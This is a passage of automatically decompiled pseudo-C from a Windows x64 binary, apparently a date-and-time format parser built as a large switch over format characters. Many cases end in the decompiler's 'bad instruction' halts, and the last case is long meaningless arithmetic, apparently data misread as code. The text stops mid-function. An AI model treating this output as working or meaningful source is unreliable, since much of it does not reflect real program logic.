in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0x16e);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x140062f87;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 0x1c) = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 4;\n                arg1_00 = in_stack_00000038;\n            }\n            break;\n        case 0x48:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0xc);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            ppauStackY576 = 0x140062eab;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 2) = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 8;\n                arg1_00 = in_stack_00000038;\n            }\n            break;\n        case 0x49:\n        case 0x4f:\n            while( true ) {\n                ppauStackY576 = 0x140062657;\n                cVar5 = fcn.140024020(&stack0xfffffffffffffe78, &stack0xfffffffffffffe68);\n                if (cVar5 != '\\0') break;\n                ppauStackY576 = 0x140062618;\n                fcn.1400240d0(&stack0xfffffffffffffe78);\n                pauVar40 = *ppauVar18;\n                ppauStackY576 = 0x14006262c;\n                cVar5 = (**pauVar40[1])(ppauVar18);\n                if (cVar5 == '\\0') break;\n                ppauStackY576 = 0x140062643;\n                fcn.1400960e0(CONCAT44(uStack388, uStack392));\n                uStack384 = 0xffff;\n            }\ncode_r0x00014006265b:\n            uVar33 = uStack384;\n            pauVar31 = pauVar31 & 0xffffffffffff0000 | uStack400;\n            auStack424 = pauVar40;\n            pauVar40 = CONCAT44(uStack388, uStack392);\n            break;\n        case 0x4b:\n            pauStack360 = *(*(puVar17 + 0x10) + 0x40);\n            piStack352 = *(*(puVar17 + 0x10) + 0x48);\n            if ((**pauStack360 == 0) || (*piStack352 == 0)) {\n                pauVar40 = CONCAT44(uStack388, uStack392);\n            }\n            else {\n                in_stack_fffffffffffffe08 = &stack0xfffffffffffffe90;\n                in_stack_fffffffffffffdf8 = NULL;\n                auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n                auStack440_00 = CONCAT412(uStack380, auStack440);\n                in_stack_fffffffffffffe38 =\n                     CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n                ppauStackY576 = 0x14006386d;\n                fcn.140060e80(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38, \n                              &stack0xfffffffffffffe94, &stack0xfffffffffffffe98, 2, in_stack_00000028, \n                              in_stack_fffffffffffffe08, in_stack_fffffffffffffe10, noname_10, pauVar31, puVar17, \n                              CONCAT44(in_stack_fffffffffffffe34, uVar47), CONCAT44(uStack404, uStack408), \n                              SUB168(in_stack_fffffffffffffe38 >> 0x40, 0), CONCAT44(uStack388, uStack392));\n                uVar33 = uStack416;\n                uStack392 = SUB164(_auStack424, 0);\n                uStack388 = SUB164(_auStack424 >> 0x20, 0);\n                uStack384 = uStack416;\n                pauVar40 = auStack424;\n                uVar47 = uStack368;\n                if ((uStack368 == 0) && (uStack364 != 0)) {\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 1;\n                }\n            }\n            break;\n        case 0x4d:\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            goto code_r0x0001400626d4;\n        case 0x52:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 6);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x14006316f;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uStack384 = uStack416;\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 3) = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n                arg1_00 = in_stack_00000038;\n            }\n            break;\n        case 0x53:\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\ncode_r0x0001400626d4:\n            ppauStackY576 = 0x140062715;\n            in_stack_fffffffffffffdf8 = in_stack_00000038;\n            in_stack_fffffffffffffe08 = in_stack_00000048;\n            fcn.140061b10(&stack0xfffffffffffffe58, arg2);\n            uStack384 = uStack416;\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            break;\n        case 0x54:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 99);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x140063063;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 6;\n                ppauStackY576 = 0x140063762;\n                cVar5 = fcn.140024020(&stack0xfffffffffffffe78, &stack0xfffffffffffffe68);\n                uVar13 = uStack364;\n                if (cVar5 == '\\0') {\n                    ppauStackY576 = 0x1400638cd;\n                    fcn.1400240d0(&stack0xfffffffffffffe78);\n                    ppauStackY576 = 0x1400638e0;\n                    iVar14 = (**(*ppauVar18)[6])(ppauVar18);\n                    ppauVar16 = iVar14 - 0x30U;\n                    uVar8 = iVar14 - 0x30U;\n                    if (9 < uVar8) goto code_r0x000140063771;\n                    ppauVar16 = uVar8;\n                    ppauStackY576 = 0x140063904;\n                    fcn.1400960e0(CONCAT44(uStack388, uStack392));\n                    uStack384 = 0xffff;\n                    uVar13 = uVar8 + uVar13 * 10;\n                    ppauStackY576 = 0x140063926;\n                    uStack364 = uVar13;\n                    cVar5 = fcn.140024020(&stack0xfffffffffffffe78, &stack0xfffffffffffffe68);\n                    if (cVar5 == '\\0') {\n                        ppauStackY576 = 0x140063949;\n                        fcn.1400240d0(&stack0xfffffffffffffe78);\n                        ppauStackY576 = 0x14006395c;\n                        cVar5 = (**(*ppauVar18)[6])(ppauVar18);\n                        if (cVar5 - 0x30U < 10) {\n                            ppauStackY576 = 0x140063977;\n                            fcn.1400960e0(CONCAT44(uStack388, uStack392));\n                            uStack384 = 0xffff;\n                            uVar13 = uVar13 * 10 + (cVar5 - 0x30U);\n                        }\n                    }\n                    arg1_00 = uVar13 - 0x76c;\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xfd;\n                }\n                else {\ncode_r0x000140063771:\n                    arg1_00 = uVar13;\n                    if (uVar13 < 0x45) {\n                        arg1_00 = uVar13 + 100;\n                    }\n                }\n                uVar33 = uStack384;\n                *(in_stack_00000038 + 0x14) = arg1_00;\n                pauVar31 = pauVar31 & 0xffffffffffff0000 | uStack400;\n                pauVar40 = CONCAT44(uStack388, uStack392);\n            }\n            break;\n        case 0x55:\n            goto code_r0x0001400693eb;\n        case 0x56:\n            *piVar21 = *piVar21 + cVar5;\n            pcVar32 = swi(1);\n            ppauVar16 = (*pcVar32)();\n            return ppauVar16;\n        case 0x57:\n            goto code_r0x000140068cac;\n        case 0x58:\n            uVar33 = iVar14 + 0x400fec28;\n            ppauStackY576 = 0x140068c6c;\n            _auStack424 = auVar45;\n            ppauStack296 = ppauVar29;\n            fcn.1400b3700(uVar33);\n            ppauStackY576 = 0x140068c7d;\n            iVar22 = fcn.1400261c0(0x1400fb420);\n            piVar37 = *(*(CONCAT44(uStack260, uStack264) + 0xd0) + 0x18) + iVar22 * 8;\n            iVar19 = *piVar37;\n            if (iVar19 == 0) {\n                ppauStackY576 = 0x14006997a;\n                puVar25 = fcn.1400b6520(0x80);\n                *(puVar25 + 1) = 0;\n                *puVar25 = 0x14010b690;\n                puVar25[2] = 0;\n                puVar25[3] = 0;\n                *(puVar25 + 4) = 0;\n                *(puVar25 + 0x22) = 0;\n                puVar25[5] = 0;\n                puVar25[6] = 0;\n                puVar25[7] = 0;\n                puVar25[8] = 0;\n                puVar25[9] = 0;\n                puVar25[10] = 0;\n                *(puVar25 + 0xb) = 0;\n                *(puVar25 + 0x5c) = 0;\n                *(puVar25 + 0x7a) = 0;\n                ppauStackY576 = 0x1400699f8;\n                fcn.14009b620(puVar25, uVar33);\n                ppauStackY576 = 0x140069a12;\n                fcn.14009d930(*(CONCAT44(uStack260, uStack264) + 0xd0), puVar25, iVar22);\n                iVar19 = *piVar37;\n            }\n            piVar21 = *(iVar19 + 0x40);\n            auStack440_00 = in_XMM1;\ncode_r0x000140068cac:\n            if (piVar21 == NULL) {\n                uVar24 = SUB168(in_stack_fffffffffffffe38 >> 0x40, 0);\n            }\n            else {\n                uVar24 = SUB168(CONCAT115(*(iVar19 + 0x50) != 0, SUB1615(in_stack_fffffffffffffe38, 0)) >> 0x40, 0);\n            }\n            arg1_00 = &stack0xfffffffffffffe80;\n            ppauStackY576 = 0x140068cd0;\n            uVar23 = fcn.140075910(0, 0);\n            uStack392 = uVar23;\n            uStack388 = uVar23 >> 0x20;\n            if (*(iVar19 + 0x20) != '\\0') {\n                ppauStackY576 = 0x140068cf1;\n                fcn.140077810(&stack0xfffffffffffffe78, 0x20);\n            }\n            auVar45 = CONCAT88(uVar24, &stack0xfffffffffffffe73);\n            ppauStackY576 = 0x140068d0a;\n            uVar24 = fcn.140075910(0, 0);\n            uStack384 = uVar24;\n            uStack382 = uVar24 >> 0x10;\n            uStack380 = uVar24 >> 0x20;\n            ppauStackY576 = 0x140068d1f;\n            fcn.140077810(arg1_00, 0x20);\n            uVar33 = 0;\n            uStack396 = *(iVar19 + 0x60);\n            in_stack_fffffffffffffe08 = NULL;\n            puVar17 = &stack0xfffffffffffffe74;\n            noname_10 = NULL;\n            in_stack_fffffffffffffe38 =\n                 CONCAT115(SUB161(auVar45 >> 0x78, 0), \n                           ZEXT1415(SUB1614(CONCAT412(SUB164(CONCAT214(SUB162(auVar45 >> 0x70, 0), \n                                                                       ZEXT1314(SUB1613(auVar45, 0))) >> 0x60, 0), \n                                                      ZEXT812(SUB168(auVar45, 0))), 0)));\n            goto code_r0x000140068d72;\n        case 0x59:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x5a:\n            *piVar21 = *piVar21 + cVar5;\n            piVar37 = in_stack_00000040 + iVar19;\n            goto code_r0x0001400683c9;\n        case 0x5b:\n            goto code_r0x000140067ce1;\n        case 0x5c:\n        case 0x5d:\n            *(uVar20 + 0x1400feae3) = *(uVar20 + 0x1400feae3) + uVar6;\n            *piVar21 = *piVar21 + uVar13;\n            auStack440_00 = *pauVar40;\n            ppauStackY576 = 0x140067c5c;\n            _auStack424 = auVar45;\n            ppauStack296 = ppauVar29;\n            fcn.1400b3700(uVar20 + 0x1400fec28);\n            ppauStackY576 = 0x140067c6d;\n            iVar22 = fcn.1400261c0(0x1400fb410);\n            piVar37 = *(*(CONCAT44(uStack260, uStack264) + 0xd0) + 0x18) + iVar22 * 8;\n            iVar19 = *piVar37;\n            if (iVar19 == 0) {\n                ppauStackY576 = 0x14006896a;\n                puVar25 = fcn.1400b6520(0x80);\n                *(puVar25 + 1) = 0;\n                *puVar25 = 0x14010b670;\n                puVar25[2] = 0;\n                puVar25[3] = 0;\n                *(puVar25 + 4) = 0;\n                *(puVar25 + 0x22) = 0;\n                puVar25[5] = 0;\n                puVar25[6] = 0;\n                puVar25[7] = 0;\n                puVar25[8] = 0;\n                puVar25[9] = 0;\n                puVar25[10] = 0;\n                *(puVar25 + 0xb) = 0;\n                *(puVar25 + 0x5c) = 0;\n                *(puVar25 + 0x7a) = 0;\n                ppauStackY576 = 0x1400689e8;\n                fcn.14009ae00(puVar25, uVar20 + 0x1400fec28);\n                ppauStackY576 = 0x140068a02;\n                fcn.14009d930(*(CONCAT44(uStack260, uStack264) + 0xd0), puVar25, iVar22);\n                iVar19 = *piVar37;\n            }\n            if (*(iVar19 + 0x40) == 0) {\n                uVar24 = SUB168(in_stack_fffffffffffffe38 >> 0x40, 0);\n            }\n            else {\n                uVar24 = SUB168(CONCAT115(*(iVar19 + 0x50) != 0, SUB1615(in_stack_fffffffffffffe38, 0)) >> 0x40, 0);\n            }\n            arg1_00 = &stack0xfffffffffffffe80;\n            ppauStackY576 = 0x140067cc0;\n            uVar23 = fcn.140075910(0, 0);\n            uStack392 = uVar23;\n            uStack388 = uVar23 >> 0x20;\n            if (*(iVar19 + 0x20) != '\\0') {\n                ppauStackY576 = 0x140067ce1;\n                fcn.140077810(&stack0xfffffffffffffe78, 0x20);\n            }\ncode_r0x000140067ce1:\n            auVar45 = CONCAT88(uVar24, &stack0xfffffffffffffe73);\n            ppauStackY576 = 0x140067cfa;\n            uVar24 = fcn.140075910(0, 0);\n            uStack384 = uVar24;\n            uStack382 = uVar24 >> 0x10;\n            uStack380 = uVar24 >> 0x20;\n            ppauStackY576 = 0x140067d0f;\n            fcn.140077810(arg1_00, 0x20);\n            uVar33 = 0;\n            uStack396 = *(iVar19 + 0x60);\n            in_stack_fffffffffffffe08 = NULL;\n            puVar17 = &stack0xfffffffffffffe74;\n            noname_10 = NULL;\n            in_stack_fffffffffffffe38 =\n                 CONCAT115(SUB161(auVar45 >> 0x78, 0), \n                           ZEXT1415(SUB1614(CONCAT412(SUB164(CONCAT214(SUB162(auVar45 >> 0x70, 0), \n                                                                       ZEXT1314(SUB1613(auVar45, 0))) >> 0x60, 0), \n                                                      ZEXT812(SUB168(auVar45, 0))), 0)));\n            goto code_r0x000140067d62;\n        case 0x5e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x5f:\n        case 0x60:\n        case 0x61:\n        case 0x80:\n        case 0x81:\n        case 0x8f:\n        case 0xd8:\n        case 0xd9:\n        case 0xe5:\n        case 0xee:\n        case 0xef:\n        case 0xf0:\n        case 0xf1:\n            goto code_r0x0001400feb58;\n        case 0x62:\n        case 0x82:\n        case 0x90:\n        case 0xa1:\n        case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 99:\n        case 0x83:\n        case 0x91:\n        case 0xa2:\n        case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 100:\n        case 0x7d:\n        case 0x7f:\n        case 0x84:\n        case 0x92:\n        case 0xa3:\n        case 0xd5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x65:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x66:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x67:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x68:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x69:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6b:\n        case 0x96:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6c:\n        case 0x8b:\n        case 0x97:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6d:\n        case 0x98:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x70:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x71:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x72:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x73:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x74:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x75:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x76:\n        case 0xb8:\n        case 0xc9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x77:\n        case 0xb9:\n        case 0xca:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x78:\n        case 0xba:\n        case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x79:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7a:\n        case 0xa7:\n        case 0xac:\n        case 0xbe:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7b:\n        case 0xa8:\n        case 0xad:\n        case 0xbf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7c:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x85:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x86:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x87:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x88:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x89:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8c:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8e:\n            ppauVar30 = ppauVar29 + -1;\n            if (ppauVar30 == NULL) goto code_r0x0001400febc0;\n            if (ppauVar29 != 0x2) goto code_r0x0001400fec2a;\n            goto code_r0x0001400feb58;\n        case 0x93:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x94:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x95:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x99:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9c:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa6:\n        case 0xab:\n        case 0xbd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xaa:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xae:\n        case 0xc0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xaf:\n        case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb0:\n        case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb3:\n        case 0xc4:\n        case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb4:\n        case 0xc5:\n        case 0xcf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb5:\n        case 0xc6:\n        case 0xd0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 200:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xda:\n        case 0xde:\n        case 0xe6:\n        case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdb:\n        case 0xdf:\n        case 0xe7:\n        case 0xeb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdd:\n            cVar34 = *piVar21;\n            cVar41 = piVar21 >> 8;\n            *piVar21 = *piVar21 + cVar41;\n            if (!SCARRY1(cVar34, cVar41)) {\n                *piVar21 = *piVar21 + uVar13;\n                *piVar21 = *piVar21 + cVar5;\n                *piVar21 = *piVar21 + cVar5;\n                *piVar21 = *piVar21 + cVar5;\n                uVar7 = cVar5 + *piVar21;\n                uVar33 = piVar21 & 0xffffffffffffff00;\n                puVar26 = uVar33 | uVar7;\n                uVar8 = *puVar26;\n                *puVar26 = *puVar26 + uVar7;\n                LOCK();\n                *(arg3 + 1) = *(arg3 + 1) + arg3 + CARRY1(uVar8, uVar7);\n                *puVar26 = *puVar26 + uVar7;\n                *0x1400feb58 = *0x1400feb58 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                uVar8 = *puVar26;\n                *puVar26 = *puVar26 + 0x58;\n                *(arg3 + 1) = *(arg3 + 1) + arg3 + (0xa7 < uVar8);\n                *puVar26 = *puVar26 + uVar7;\n                bVar38 = CARRY1(*0x1400feb58, uVar7);\n                *0x1400feb58 = *0x1400feb58 + uVar7;\n                *puVar26 = (*puVar26 - uVar7) - bVar38;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                puVar26[0x140108c] = puVar26[0x140108c] + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                puVar1 = puVar26 + 0x70;\n                uVar8 = *puVar1;\n                uVar28 = uVar33 >> 8;\n                *puVar1 = *puVar1 + uVar28;\n                puVar26[1] = puVar26[1] + uVar7 + CARRY1(uVar8, uVar28);\n                *puVar26 = *puVar26 + uVar7;\n                puVar26[0x140108c] = puVar26[0x140108c] + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                puVar26[0x1401070] = puVar26[0x1401070] + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                puVar26[0x140108c] = puVar26[0x140108c] + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                puVar26[0x1401070] = puVar26[0x1401070] + uVar28;\n                *puVar26 = *puVar26 + uVar7;\n                puVar1 = puVar26 + -0x73;\n                uVar8 = *puVar1;\n                *puVar1 = *puVar1 - 0x15;\n                puVar26[1] = puVar26[1] + uVar7 + (0x14 < uVar8);\n                *puVar26 = *puVar26 + uVar7;\n                uVar8 = uVar7 * '\\x02';\n                piVar21 = uVar33 | uVar8;\n                if (!SCARRY1(uVar7, uVar7)) {\n                    *piVar21 = *piVar21 + piVar21;\n                    *piVar21 = *piVar21 + uVar8;\n                    *piVar21 = *piVar21 + uVar8;\n                    *piVar21 = *piVar21 + uVar8;\n                    cVar5 = *piVar21;\n                    piVar21 = uVar33 | uVar8 + cVar5;\n                    *piVar21 = *piVar21 + uVar8 + cVar5;\n                    puVar36[0x10] = puVar36[0x10] & uVar6;\n                }\n                *piVar21 = *piVar21 + piVar21;\n                *piVar21 = *piVar21 + piVar21;\n                uVar7 = piVar21 + *piVar21;\n                uVar33 = piVar21 & 0xffffffffffffff00;\n                puVar26 = uVar33 | uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                uVar8 = *puVar26;\n                *puVar26 = *puVar26 + uVar7;\n                puVar26[0x1400feb98] = puVar26[0x1400feb98] << 1 | CARRY1(uVar8, uVar7);\n                *puVar26 = *puVar26 + uVar7;\n                *0x1400feb58 = *0x1400feb58 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                *puVar26 = *puVar26 + uVar7;\n                puVar1 = puVar26 + -0x73;\n                uVar8 = *puVar1;\n                *puVar1 = *puVar1 - 0x15;\n                puVar26[1] = puVar26[1] + uVar7 + (0x14 < uVar8);\n                *puVar26 = *puVar26 + uVar7;\n                cVar5 = uVar33 >> 8;\n                uVar8 = uVar7 + cVar5;\n                piVar21 = uVar33 | uVar8;\n                if (!SCARRY1(uVar7, cVar5)) {\n                    *piVar21 = *piVar21 + piVar21;\n                    *piVar21 = *piVar21 + uVar8;\n                    *piVar21 = *piVar21 + uVar8;\n                    *piVar21 = *piVar21 + uVar8;\n                    cVar5 = *piVar21;\n                    piVar21 = uVar33 | uVar8 + cVar5;\n                    *piVar21 = *piVar21 + uVar8 + cVar5;\n                    puVar36[0x10] = puVar36[0x10] & uVar6;\n                }\n                *piVar21 = *piVar21 + piVar21;\n                *piVar21 = *piVar21 + piVar21;\n                uVar7 = piVar21 + *piVar21;\n                piVar27 = piVar21 & 0xffffffffffffff00 | uVar7;\n                *piVar27 = *piVar27 + uVar7;\n                *piVar27 = *piVar27 + uVar7;\n                uVar8 = *piVar27;\n                *piVar27 = *piVar27 + uVar7;\n                *(piVar27 + 0x5003fae6) = *(piVar27 + 0x5003fae6) << 1 | CARRY1(uVar8, uVar7);\n                *piVar27 = *piVar27 + uVar7;\n                *0x1400feb58 = *0x1400feb58 + uVar7;\n                